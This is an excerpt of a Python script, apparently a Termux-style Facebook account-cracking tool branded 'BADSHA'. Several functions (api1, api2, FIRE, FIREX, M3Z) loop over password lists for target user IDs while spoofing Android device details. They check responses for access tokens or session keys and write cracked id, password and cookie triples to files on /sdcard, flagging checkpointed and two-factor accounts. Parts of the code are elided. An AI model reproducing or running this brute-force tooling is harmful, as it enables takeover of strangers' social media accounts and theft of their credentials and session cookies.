...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92m🅑🅐🅓🅢🅗🅐\33[1;91m⊁ ')
...
\33[1;92m─────────────────────────────────────────────
\33[1;92m DEVELOPER    \33[1;91m ◉     \x1b[38;5;48m🅑🅐🅓🅢🅗🅐 	  
\33[1;92m FACEBOOK \33[1;91m     ◉     \x1b[38;5;208🅑🅐🅓🅢🅗🅐 ON 🔥	 	
\33[1;92m GITHUB     \33[1;91m   ◉    \x1b[38;5;47m 🅑🅐🅓🅢🅗🅐-KING	\33[1;91m[\33[1;95m🅑🅐🅓🅢🅗🅐\33[1;91m]
\33[1;92m─────────────────────────────────────────────
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m FILE NAME : /sdcard/🅑🅐🅓🅢🅗🅐.txt  etc..')
				linex()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {b}[{G}🅑🅐🅓🅢🅗🅐-M2{b}]-[{G}%s{b}]-[{G}OK:%s{b}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {b}[{G}LIVE-OK{b}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/🅑🅐🅓🅢🅗🅐-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[🅑🅐🅓🅢🅗🅐-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[🅑🅐🅓🅢🅗🅐-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {b}[{G}🅑🅐🅓🅢🅗🅐-M1{b}]-[{G}%s{b}]-[{G}OK:%s{b}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92m🅑🅐🅓🅢🅗🅐-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {b}[{G}LIVE-OK{b}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {b}[{G}•{b}]{G} '+kuki+'')
                linex()
                open('/sdcard/🅑🅐🅓🅢🅗🅐-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92m🅑🅐🅓🅢🅗🅐-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {b}[{G}•{b}]{G} '+kuki+'')
                linex()
                open('/sdcard/🅑🅐🅓🅢🅗🅐-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92m🅑🅐🅓🅢🅗🅐-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {b}[{G}•{b}]{G} '+kuki+'')
                linex()
                open('/sdcard/🅑🅐🅓🅢🅗🅐-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
